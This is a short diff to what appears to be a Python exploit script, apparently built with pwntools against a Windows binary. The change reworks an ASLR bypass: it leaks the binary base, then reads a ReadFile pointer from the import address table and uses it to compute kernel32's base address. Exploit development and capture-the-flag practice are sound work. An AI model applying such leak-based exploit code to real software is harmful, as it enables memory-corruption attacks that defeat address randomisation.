@@ -92,7 +92,9 @@ def exploit():
     bin_base = leak(ldrdata + 0x30)
     log.info('bin base: ' + hex(bin_base))
 
-    kernel32 = leak(bin_base + 0x3000) - 0x22680
+    iat = bin_base + 0x3000
+    readfile = leak(iat)
+    kernel32 = readfile - 0x22680
     log.info('kernel32: ' + hex(kernel32))
 
     target = bin_base + 0x1b60
